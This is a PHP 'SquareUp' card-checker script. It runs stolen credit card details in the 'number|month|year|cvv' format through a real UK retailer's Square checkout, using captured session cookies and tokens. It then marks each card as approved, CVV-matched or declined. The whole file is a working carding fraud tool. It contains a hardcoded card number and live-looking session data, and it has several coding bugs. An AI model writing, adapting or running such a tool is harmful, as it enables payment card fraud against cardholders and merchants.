<?php
//////////////SQUAREUP RAW BY SKYLAR\\\\\\\\\\\\\\\\\\\\\
session_start();
error_reporting(0);
ini_set('display_errors', 0);
function getStr2($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

if (file_exists(getcwd().('/cookie.txt'))) { 
    @unlink('cookie.txt'); 
}



////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

/////////////////////////////////

////////////////////////

$lista   = $_GET['lista']; 
$explode = explode('|',$lista); 
$cc     = $explode[0]; 
$mes     = $explode[1];
$ano     = $explode[2];
$cvv     = $explode[3];
$ano = substr($ano, 0, 4);
if (strlen($cc) == 16) {
    $last4 = substr($cc, 12, 16);
} else {
    $last4 = substr($cc, 11, 15);
}
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
/////////========== 1ST REQ ==============///////////
switch ($mes) {
  case '01':
  $mes = '1';
    break;
  case '02':
  $mes = '2';
    break;
  case '03':
  $mes = '3';
    break;
  case '04':
  $mes = '4';
    break;
  case '05':
  $mes = '5';
    break;
  case '06':
  $mes = '6';
    break;
  case '07':
  $mes = '7';
    break;
  case '08':
  $mes = '8';
    break;
    case '09':
    $mes = '9';
    break;
}
$typo = substr($cc, 0, 1);
 if (strpos($typo, '4')) {
    $typew = 'VI';
    }
 elseif (strpos($typo, '5')) {
    $typew = 'MC';
    }
////////////////////////////////////////////////
$post = '{"client_id":"sq0idp-44DdJoMjFy9fTcbhVfTDKw","location_id":"YPRFA9B0NPNCZ","session_id":"iKQpWCAj9kBXXgVvouaNVQoFi4A1rLkog7NchS_w4fKHwICY_rDRKz2n4bGbDUpzmAwUdjqvRjTrFot8IGI=","website_url":"https://www.flooringhut.co.uk/","squarejs_version":"27d3bdf1bc","analytics_token":"ZWSHAERBO5QMFU6ZPSURZB7GB47BPK2PATUZG3NJCS67RUOANO4NTXKRPQLI2KI2FDZ4IRULBFJYELZAA772YYWHKZDST5MH","card_data":{"number":"4239929495130929","exp_month":4,"exp_year":2026,"cvv":"181","billing_postal_code":"AS959FF"}}';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pci-connect.squareup.com/v2/card-nonce?_=1622802632941.176&version=27d3bdf1bc');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: pci-connect.squareup.com',
'method: POST',
'path: /v2/card-nonce?_=1622802632941.176&version=27d3bdf1bc',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/json; charset=UTF-8',
'cookie: _savt=9f48ac9e-3f0a-408e-a714-54c44294f634',
'origin: https://pci-connect.squareup.com',
'referer: https://pci-connect.squareup.com/v2/iframe?type=main&app_id=sq0idp-44DdJoMjFy9fTcbhVfTDKw&host_name=www.flooringhut.co.uk&location_id=YPRFA9B0NPNCZ&version=27d3bdf1bc',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
'x-js-id: undefined'
));
echo $resulta = curl_exec($ch);
$resulta1 = json_decode($resulta, true);
$cnon = trim(strip_tags(getStr2($resulta,'"card_nonce":"','"'))); 
echo $cnon; 

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////
$post = '{"browser_fingerprint_by_version":[{"payload_json":"{\"components\":{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1474,864],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"Chrome PDF Plugin::Portable Document Format::application/x-google-chrome-pdf~pdf\",\"Chrome PDF Viewer::::application/pdf~pdf\",\"Native Client::::application/x-nacl~,application/x-pnacl~\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"19fcdee54dc489b9dbd92ee359e8b521\"}","payload_type":"fingerprint-v1"},{"payload_json":"{\"components\":{\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1474,864],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"Chrome PDF Plugin::Portable Document Format::application/x-google-chrome-pdf~pdf\",\"Chrome PDF Viewer::::application/pdf~pdf\",\"Native Client::::application/x-nacl~,application/x-pnacl~\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]},\"fingerprint\":\"e675a5d2d13511609b7e5a63fdb1f256\"}","payload_type":"fingerprint-v1-sans-ua"}],"browser_profile":{"components":"{\"user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\",\"language\":\"en-US\",\"color_depth\":24,\"resolution\":[1536,864],\"available_resolution\":[1474,864],\"timezone_offset\":-330,\"session_storage\":1,\"local_storage\":1,\"open_database\":1,\"cpu_class\":\"unknown\",\"navigator_platform\":\"Win32\",\"do_not_track\":\"unknown\",\"regular_plugins\":[\"Chrome PDF Plugin::Portable Document Format::application/x-google-chrome-pdf~pdf\",\"Chrome PDF Viewer::::application/pdf~pdf\",\"Native Client::::application/x-nacl~,application/x-pnacl~\"],\"adblock\":false,\"has_lied_languages\":false,\"has_lied_resolution\":false,\"has_lied_os\":false,\"has_lied_browser\":false,\"touch_support\":[0,false,false],\"js_fonts\":[\"Arial\",\"Arial Black\",\"Arial Narrow\",\"Book Antiqua\",\"Bookman Old Style\",\"Calibri\",\"Cambria\",\"Cambria Math\",\"Century\",\"Century Gothic\",\"Century Schoolbook\",\"Comic Sans MS\",\"Consolas\",\"Courier\",\"Courier New\",\"Garamond\",\"Georgia\",\"Helvetica\",\"Impact\",\"Lucida Bright\",\"Lucida Calligraphy\",\"Lucida Console\",\"Lucida Fax\",\"Lucida Handwriting\",\"Lucida Sans\",\"Lucida Sans Typewriter\",\"Lucida Sans Unicode\",\"Microsoft Sans Serif\",\"Monotype Corsiva\",\"MS Gothic\",\"MS Outlook\",\"MS PGothic\",\"MS Reference Sans Serif\",\"MS Sans Serif\",\"MS Serif\",\"Palatino Linotype\",\"Segoe Print\",\"Segoe Script\",\"Segoe UI\",\"Segoe UI Light\",\"Segoe UI Semibold\",\"Segoe UI Symbol\",\"Tahoma\",\"Times\",\"Times New Roman\",\"Trebuchet MS\",\"Verdana\",\"Wingdings\",\"Wingdings 2\",\"Wingdings 3\"]}","fingerprint":"19fcdee54dc489b9dbd92ee359e8b521","version":"0f725b5aa454b79bda2c7aac780dfa45ea6a6f5b","website_url":"https://www.flooringhut.co.uk/"},"client_id":"sq0idp-44DdJoMjFy9fTcbhVfTDKw","payment_source":"'.$cnon.'","universal_token":{"token":"YPRFA9B0NPNCZ","type":"UNIT"},"verification_details":{"billing_contact":{"address_lines":["WAyside Lane 6854"],"city":"New York","country":"GB","email":"nothuman1701@gmail.com","family_name":"NIce","given_name":"NAme","phone":"2015632564","postal_code":"AS959FF"},"intent":"CHARGE","total":{"amount":9181,"currency":"GBP"}}}';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://connect.squareup.com/v2/analytics/verifications');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: connect.squareup.com',
'method: POST',
'path: /v2/analytics/verifications',
'scheme: https',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'cookie: _savt=9f48ac9e-3f0a-408e-a714-54c44294f634',
'origin: https://connect.squareup.com',
'referer: https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fwww.flooringhut.co.uk%2Fcheckout%2F%23payment',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
));
echo $resultb = curl_exec($ch);
$resultb1 = json_decode($resultb, true);
$verf = trim(strip_tags(getStr2($resultb,'"token":"','"'))); 
echo $verf; 

////////////////////////////////////////////////
////////////////////////////////////////////////
$post = '{"cartId":"JYlC09CE5xz7gnAXcew75FQlOrScCFD8","billingAddress":{"countryId":"GB","regionCode":"","region":"","street":["WAyside Lane 6854"],"company":"","telephone":"2015632564","fax":"","postcode":"AS959FF","city":"New York","firstname":"NIce","lastname":"NAme","saveInAddressBook":null},"paymentMethod":{"method":"squareup_payment","additional_data":{"cc_cid":"","cc_ss_start_month":"","cc_ss_start_year":"","cc_ss_issue":"","cc_type":"VISA","cc_exp_year":"2026","cc_exp_month":"4","cc_number":"","nonce":"'.$cnon.'","digital_wallet":"NONE","cc_last_4":"0929","buyerVerificationToken":"'.$verf.'","display_form":true}},"email":"nothuman1701@gmail.com"}';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.flooringhut.co.uk/rest/fhdomestic/V1/guest-carts/fwiIbJjCkX80SP7H9iZJHPeKbHB6wAAa/payment-information');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.flooringhut.co.uk',
'method: POST',
'path: /rest/fhdomestic/V1/guest-carts/JYlC09CE5xz7gnAXcew75FQlOrScCFD8/payment-information',
'scheme: https',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'cookie: _ga=GA1.4.879687577.1622574589; _fbp=fb.2.1622574592043.1781157306; apay-session-set=TZE5z0OnAoRAB2g8acqfX4%2FFrkcv46nmBSd5MVieZ6KBY2FgAom6ayqKFtveHj4%3D; __tawkuuid=e::flooringhut.co.uk::hA/EEuGCXS4FRGBvh+kavmXa7Tf5ueVgBEXXEWzmH0dBrFCDVlr2DS/e9tk0cSYE::2; PHPSESSID=plk553oskupgddsvh8krc9obcf; _gid=GA1.4.1003854987.1622802435; form_key=34QSSuNAQ1lQkyKG; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=34QSSuNAQ1lQkyKG; private_content_version=e3c6626209c36f744917fa0128abf5c8; TawkConnectionTime=0; language=en_GB; amazon-pay-connectedAuth=connectedAuth_general; section_data_ids=%7B%22cart%22%3A1622802456%2C%22directory-data%22%3A1622802449%2C%22messages%22%3A1622802612%7D',
'origin: https://www.flooringhut.co.uk',
'referer: https://www.flooringhut.co.uk/checkout/',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
'x-requested-with: XMLHttpRequest'
));
echo $resultc = curl_exec($ch);
$resultc1 = json_decode($resultc, true);
$resp = trim(strip_tags(getStr2($resultc,"<div id='validation_message_2_4' class='gfield_description validation_message' aria-live='polite'>","</div>"))); 
echo $resp; 

////////////////////////////////////////////////

if (strpos($resultc, "Authorization error: 'ADDRESS_VERIFICATION_FAILURE'")) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info"> [SQUAREUP] [★ WOLFIE ★ ] </span> </span>  <span class="text-succes">#Aprovada</span></span> <span class="text-success"> R:  CVV MATCHED </span></br>';
} 

elseif (strpos($resultc, "Authorization error: 'CVV_FAILURE'")) {

  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info"> [SQUAREUP] [★ WOLFIE ★ ] </span> </span>  <span class="text-succes">#Aprovada</span></span> <span class="text-success"> R:  CNN MATCHED </span></br>';

} 

elseif (strpos($resultc, "Authorization error: 'GENERIC_DECLINE'")) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[SQUAREUP] [★ WOLFIE ★ ]  </span> <span class="text-danger">[SITE CANT MASS CHECK]</span></span> </span> <span class="text-danger"> R: DEAD- SITE CANT MASS CHECK </span></br>';
}
elseif (strpos($resultc, "Authorization error: 'TRANSACTION_LIMIT'")) {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[SQUAREUP] [★ WOLFIE ★ ]  </span> <span class="text-danger">[TRANSACTION NOT ALLOWED]#Aprovada</span></span> </span> <span class="text-danger"> R: CVV MATCHED '.$reason.' </span></br>';
}
else {
  echo '<span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text-info">[SQUAREUP] [★ WOLFIE ★ ]  </span> <span class="text-danger">[#Declined]</span></span> </span> <span class="text-danger"> R:  DECLINED </span></br>';
}

curl_close($ch);

ob_flush();
//////////////SQUAREUP RAW BY SKYLAR\\\\\\\\\\\\\\\\\\\\\

?>

